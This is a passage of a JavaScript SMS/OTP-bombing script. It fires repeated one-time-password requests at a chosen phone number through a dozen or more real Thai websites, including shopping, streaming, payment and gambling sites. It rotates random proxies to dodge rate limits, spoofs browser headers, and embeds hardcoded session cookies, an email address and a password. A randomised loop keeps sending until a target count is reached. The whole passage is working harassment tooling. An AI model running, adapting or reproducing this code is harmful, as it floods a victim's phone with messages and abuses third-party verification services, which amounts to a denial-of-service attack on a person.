                httpsAgent: agent 
            };
            axios(config)
                .then(function (response) {
                    console.log("BFHMSC API 19 SEND");
                    countting++; 
                })
                .catch(function (error) {
                    console.error("Error:", error); 
                });
        }
        
        // API 20
        function bfhmscapi20() {
            var phone = phonenumber; 
            let proxy = proxies[Math.floor(Math.random() * proxies.length)];
            var agent = new HttpsProxyAgent('http://' + proxy);
            if (phone.startsWith("0")) {
                phone = phone.substring(1); 
            }
            var url = "https://semi.devh5api16.shop/api/h5/otp/request";
            var headers = {
                "Accept": "application/json, text/plain, */*",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Accept-Language": "th",
                "Content-Type": "application/json",
                "Origin": "https://swd555go.com",
                "Referer": "https://swd555go.com/",
                "Sec-Ch-Ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
                "Sec-Ch-Ua-Mobile": "?0",
                "Sec-Ch-Ua-Platform": '"Windows"',
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "cross-site",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
                "X-Token": "", 
                "X-Userid": "undefined"
            };
            var payload = {
                "isEncrypt2161": "N",
                "data": {
                    "mobileNumber": `66${phone}`, 
                    "check": "yes"
                }
            };
            const config = {
                method: 'post',
                url: url,
                headers: headers,
                data: JSON.stringify(payload), 
                httpsAgent: agent 
            };
            axios(config)
                .then(function (response) {
                    console.log("BFHMSC API 20 SEND");
                    countting++; 
                })
                .catch(function (error) {
                    console.error("Error"); 
                });
        }
        

        // API 21
        async function bfhmscapi21() {
            var phone = phonenumber;  
            let proxy = proxies[Math.floor(Math.random() * proxies.length)];  
            var agent = new HttpsProxyAgent('http://' + proxy);
            
            var url = "https://www.konvy.com/ajax/system.php?action=get_phone_code";
            
            var headers = {
                "Accept": "application/json, text/plain, text/html, text/xml, text/javascript, image/webp, */*",
                "Content-Type": "application/x-www-form-urlencoded",
                "X-Requested-With": "XMLHttpRequest",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
                "Cookie": "f34c_lang2=th_TH; _gcl_au=1.1.772736218.1693663780; _tt_enable_cookie=1; _ttp=dNuShIuyOWBlc6c6_g0VW_C-1ma; k_privacy_state=true; _fbp=fb.1.1693663782140.1359249614; _gid=GA1.2.496014264.1694796867; _gat_UA-28072727-2=1; PHPSESSID=rjuo4ifo49s0d04ekrk5h6bd28; _ga=GA1.1.1256061802.1693663783; _ga_Z9S47GV47R=GS1.1.1694796867.2.1.1694796880.47.0.0; cto_bundle=03x9gV9aSGdNUVFwNUd4Y0RkUzNKZkl2aiUyQlRHNDlzbURwMVdXNDlxc1dMUHM0UXk0c0hId3dFMXhodXAySTV0TjJDSEFQSU9FUmo3Zm1idHYxZldLV3ZQTUdpMThmeUtGbGROJTJGRUxmTGJpZm00ZloyVzFEdFFFeFZCZUVrdWZlT1pEUUhYck9pRUpseGMlMkJVejdON3JVaHoyRlElM0QlM0Q", // Truncated for brevity
            };
        
            var data = `type=reg&phone=${phone}&platform=1`;
            console.log("BFHMSC konvy API 21 SEND");
            
            try {
                const response = await axios.post(url, data, {
                    headers: headers,
                    httpAgent: agent,  // If using axios, set the proxy agent here
                    httpsAgent: agent
                });
                console.log("Response data");
            } catch (error) {
                console.error("Error sending request");
            }
        }


        // API 22
        async function bfhmscapi22() {
            var phone = phonenumber;  // Assume phonenumber is defined elsewhere
            let proxy = proxies[Math.floor(Math.random() * proxies.length)];  
            var agent = new HttpsProxyAgent('http://' + proxy);
            
            var url = "https://cognito-idp.ap-southeast-1.amazonaws.com/";
        
            // Set the headers
            var headers = {
                "Cache-Control": "max-age=0",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36",
                "Content-Type": "application/x-amz-json-1.1",
                "X-Amz-Target": "AWSCognitoIdentityProviderService.ResendConfirmationCode",
                "X-Amz-User-Agent": "aws-amplify/0.1.x js",
                "Referer": "https://www.bugaboo.tv/members/resetpass/phone"
            };
        
            // Prepare the JSON payload
            var data = {
                "ClientId": "6g47av6ddfcvi06v4l186c16d6",
                "Username": `+66${phone.substring(1)}`  // Assuming the phone number starts with '0'
            };
        
            console.log("BFHMSC bugaboo API 22 SEND");
        
            try {
                const response = await axios.post(url, data, {
                    headers: headers,
                    httpAgent: agent,  // Setting the proxy agent for HTTP requests
                    httpsAgent: agent  // Setting the proxy agent for HTTPS requests
                });
                console.log("Response data:");
            } catch (error) {
                console.error("Error sending request:");
            }
        }

        // API 23
        async function bfhmscapi23() {
            var phone = phonenumber;  
            let proxy = proxies[Math.floor(Math.random() * proxies.length)];  
            var agent = new HttpsProxyAgent('http://' + proxy);
            var url = "https://pygw.csne.co.th/api/gateway/truewalletRequestOtp";
            var headers = {
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
                "cookie": "pygw_csne_coth=91207b7404b2c71edd9db8c43c6d18c23949f5ea"
            };
            var data = new URLSearchParams({
                "transactionId": "b05a66a7e9d0930cbda4d78b351ea6f7",  
                "phone": phone
            });
        
            console.log("BFHMSC pygw API 23 SEND");
        
            try {
                const response = await axios.post(url, data.toString(), {
                    headers: headers,
                    httpAgent: agent,  
                    httpsAgent: agent  
                });
                console.log("Response data",);
            } catch (error) {
                console.error("Error sending request");
            }
        }

        // API 24
        async function bfhmscapi24() {
            var phone = phonenumber;  
            let proxy = proxies[Math.floor(Math.random() * proxies.length)];  
            var agent = new HttpsProxyAgent('http://' + proxy);
            var url = "https://www.easymoney.co.th/estimate/actionSendOtp";
            var headers = {
                "accept": "application/json, text/javascript, */*; q=0.01",
                "content-type": "application/x-www-form-urlencoded",
                "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36",
                "cookie": "PHPSESSID=1933025720c12fcbb618a207ad775e54; _gcl_au=1.1.506859633.1650848781; _fbp=fb.2.1650848782133.743024538; _ga=GA1.3.1379383593.1650848782; pdpa=1; _gid=GA1.3.380431543.1651807350; _gat_UA-182229042-1=1"
            };
            var data = new URLSearchParams({
                "gg_token": "",  
                "name": "cybersafe",
                "surname": "cybersafe",
                "email": "rjrockyou@gmail.com",
                "phone": phone,
                "area_id": "2",
                "password": "Hack80",
                "password_chk": "Hack80",
                "code": "",
                "condition": "1"
            });
            console.log("BFHMSC easymoney API 24 SEND");
            try {
                const response = await axios.post(url, data.toString(), {
                    headers: headers,
                    httpAgent: agent,  
                    httpsAgent: agent  
                });
                console.log("Response data");
            } catch (error) {
                console.error("Error sending request");
            }
        }

        
        // API 25
        async function bfhmscapi25() {
            var phone = phonenumber;  
            let proxy = proxies[Math.floor(Math.random() * proxies.length)];  
            var agent = new HttpsProxyAgent('http://' + proxy);
            var url = "https://m-api.hhh-st1.xyz/api/otp/register";
            var headers = {
                "content-type": "application/json",
                "accept": "application/json, text/plain, */*",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
            };
            var payload = {
                "applicant": phone,
                "serviceName": "hihuay.com"
            };
            console.log("BFHMSC hihuay API 25 SEND");
            try {
                const response = await axios.post(url, payload, {
                    headers: headers,
                    httpAgent: agent,  
                    httpsAgent: agent  
                });
                console.log("Response data");
            } catch (error) {
                console.error("Error sending request");
            }
        }

        // API 26
        async function bfhmscapi26() {
            var phone = phonenumber;  
            let proxy = proxies[Math.floor(Math.random() * proxies.length)];  
            var agent = new HttpsProxyAgent('http://' + proxy);
            var url = "https://mapi.hit789.com/api/otp/register";
            var data = {
                "applicant": phone,
                "serviceName": "hit789.com"
            };
            console.log("BFHMSC hit789 API 26 SEND");
            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(data),
                    agent: agent 
                });
                if (!response.ok) {
                    throw new Error(`HTTP error! status`);
                }
                const responseData = await response.json();
                console.log("Response Data");
            } catch (error) {
                console.error("Error occurred");
            }
        }

        // API 27
        async function bfhmscapi27() {
            var phone = phonenumber;  
            let proxy = proxies[Math.floor(Math.random() * proxies.length)];  
            var agent = new HttpsProxyAgent('http://' + proxy);
            var url = "https://mapi.konglor888.com/api/otp/register";
            var data = {
                "applicant": phone,
                "serviceName": "konglor888.com"
            };
            console.log("BFHMSC konglor888 API 27 SEND");
            try {
                let response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(data),
                    agent: agent  
                });
                if (!response.ok) {
                    throw new Error(`HTTP error! status`);
                }
                let responseData = await response.json();
                console.log("Response Data");
            } catch (error) {
                console.error("Error during API call");
            }
        }

        // API 28
        async function bfhmscapi28() {
            var phone = phonenumber;  
            let proxy = proxies[Math.floor(Math.random() * proxies.length)];  
            var agent = new HttpsProxyAgent('http://' + proxy);
            
            const url = "https://lb-api.fox83-sy.xyz/api/otp/register";
            const data = {
                "applicant": phone, 
                "serviceName": "fox888.com"
            };
            console.log("BFHMSC fox888 API 28 SEND");
            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(data),
                    agent: agent 
                });
                if (!response.ok) {
                    throw new Error(`HTTP error! Status`);
                }

                const jsonResponse = await response.json();
                console.log("Response received");
            } catch (error) {
                console.error("Error sending request");
            }
        }


        // API 29
        async function bfhmscapi29() {
            var phone = phonenumber;  
            let proxy = proxies[Math.floor(Math.random() * proxies.length)];  
            var agent = new HttpsProxyAgent('http://' + proxy);
            const url = "https://login1.miikwaamsuk.com/user/phone_verify";
            const headers = {
                "Accept": "*/*",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Accept-Language": "en-US,en;q=0.9",
                "Content-Type": "application/json",
                "Origin": "https://www.kohkoh99.com",
                "Priority": "u=1, i",
                "Referer": "https://www.kohkoh99.com/",
                "Sec-Ch-Ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
                "Sec-Ch-Ua-Mobile": "?0",
                "Sec-Ch-Ua-Platform": '"Windows"',
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "cross-site",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
            };
            const payload = {
                "phone_num": phone,
                "app_id": "2383"
            };
        
            console.log("BFHMSC API kohkoh99 29 SEND");
        
            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: headers,
                    body: JSON.stringify(payload),
                    agent: agent 
                });
        
                if (!response.ok) {
                    throw new Error(`HTTP error! Status`);
                }
        
                const jsonResponse = await response.json();
                console.log("Response received");
            } catch (error) {
                console.error("Error sending request");
            }
        }

        // API 30
        async function bfhmscapi30() {
            var phone = phonenumber;  
            let proxy = proxies[Math.floor(Math.random() * proxies.length)];  
            var agent = new HttpsProxyAgent('http://' + proxy);
            const url_otp = "https://tw2x.info/api/otp";
            const headers = {
                "Accept": "application/json, text/plain, */*",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Accept-Language": "en-US,en;q=0.9",
                "Content-Type": "application/json",
                "Origin": "https://tw2x.info",
                "Referer": "https://tw2x.info/?openExternalBrowser=1",
                "Sec-Ch-Ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
                "Sec-Ch-Ua-Mobile": "?0",
                "Sec-Ch-Ua-Platform": '"Windows"',
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-origin",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            };
            const data = {
                "phone_number": phone,
                "register_type": "",
                "type_otp": "register"
            };
            console.log("BFHMSC API tw2x 30 SEND");
            try {
                const response = await fetch(url_otp, {
                    method: 'POST',
                    headers: headers,
                    body: JSON.stringify(data),
                    agent: agent 
                });
                if (!response.ok) {
                    throw new Error(`HTTP error! Status`);
                }
        
                const jsonResponse = await response.json();
                console.log("Response received");
            } catch (error) {
                console.error("Error sending request");
            }
        }
        
        setInterval(() => {
            if (count == countting) {
                process.exit(0);
            } else {
                var randomnum = Math.floor(Math.random() * 30);
                switch (randomnum + 1) {
                    case 1: {
                        bfhmscapi1();
                        break;
                    }
                    case 2: {
                        bfhmscapi2();
                        break;
                    }
                    case 3: {
                        bfhmscapi3();
                        break;
                    }
                    case 4: {
                        bfhmscapi4();
                        break;
                    }
                    case 5: {
                        bfhmscapi5();
                        break;
                    }
                    case 6: {
                        bfhmscapi6();
                        break;
                    }
                    case 7: {
                        bfhmscapi7();
                        break;
                    }
                    case 8: {
                        bfhmscapi8();
                        break;
                    }
                    case 9: {
                        bfhmscapi9();
                        break;
                    }
                    case 10: {
                        bfhmscapi10();
                        break;
                    }
                    case 11: {
                        bfhmscapi11();
                        break;
                    }
                    case 12: {
                        bfhmscapi12();
                        break;
                    }
                    case 13: {
                        bfhmscapi13();
                        break;
                    }
                    case 14: {
                        bfhmscapi14();
                        break;
                    } 
                    case 15: {
                        bfhmscapi15();
                        break;
                    } 
                    case 16: {
                        bfhmscapi16();
                        break;
                    } 
                    case 17: {
                        bfhmscapi17();
                        break;
                    }
                    case 18: {
                        bfhmscapi18();
                        break;
                    }
                    case 19: {
                        bfhmscapi19();
                        break;
                    }     
                    case 20: {
                        bfhmscapi20();
                        break;
                    }   
                    case 21: {
                        bfhmscapi21();
                        break;
                    }       	
                    case 22: {
                        bfhmscapi22();
                        break;
                    }       	
                    case 23: {
                        bfhmscapi23();
                        break;
                    }       	
                    case 24: {
                        bfhmscapi25();
                        break;
                    }       	
                    case 25: {
                        bfhmscapi25();
                        break;
                    }       	
                    case 26: {
                        bfhmscapi26();
                        break;
                    }       	
                    case 27: {
                        bfhmscapi27();
                        break;
                    }       	
                    case 28: {
                        bfhmscapi28();
                        break;
                    }      
                    case 29: {
                        bfhmscapi29();
                        break;
                    }  
                    case 30: {
                        bfhmscapi30();
                        break;
                    }       	     	 	    		
                 }
            }
        });
    }
})();
